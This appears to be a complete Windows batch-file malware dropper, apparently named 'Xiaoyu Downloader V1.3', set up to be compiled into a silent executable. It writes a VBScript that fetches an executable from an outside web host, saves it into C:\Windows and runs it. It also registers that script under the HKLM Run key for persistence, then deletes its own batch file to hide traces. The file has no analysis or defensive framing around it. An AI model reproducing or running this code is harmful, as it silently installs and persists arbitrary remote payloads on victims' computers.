
@rem ----- ExeScript Options Begin -----
@rem ScriptType: console,silent
@rem DestDirectory: current
@rem Icon: default
@rem OutputFile: D:\我的文档\桌面\小宇下载者 V1.3\a.exe
@rem ----- ExeScript Options End -----
echo Set xPost = createObject("Microsoft.XMLHTTP") >C:\Windows\Henry.vbs
echo xPost.Open "GET","http://www.agj7.com/mstise.exe",0 >>C:\Windows\Henry.vbs
echo xPost.Send() >>C:\Windows\Henry.vbs
echo Set sGet = createObject("ADODB.Stream") >>C:\Windows\Henry.vbs
echo sGet.Mode = 3 >>C:\Windows\Henry.vbs
echo sGet.Type = 1 >>C:\Windows\Henry.vbs
echo sGet.Open() >>C:\Windows\Henry.vbs
echo sGet.Write(xPost.responseBody) >>C:\Windows\Henry.vbs
echo sGet.SaveToFile "C:\Windows\Nerve.exe",2 >>C:\Windows\Henry.vbs
echo Set objShell = CreateObject("Wscript.Shell") >>C:\Windows\Henry.vbs
echo objshell.run """C:\Windows\Nerve.exe""" >>C:\Windows\Henry.vbs
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /ve /d "C:\Windows\Henry.vbs" /f
C:\Windows\Henry.vbs
@del hack.bat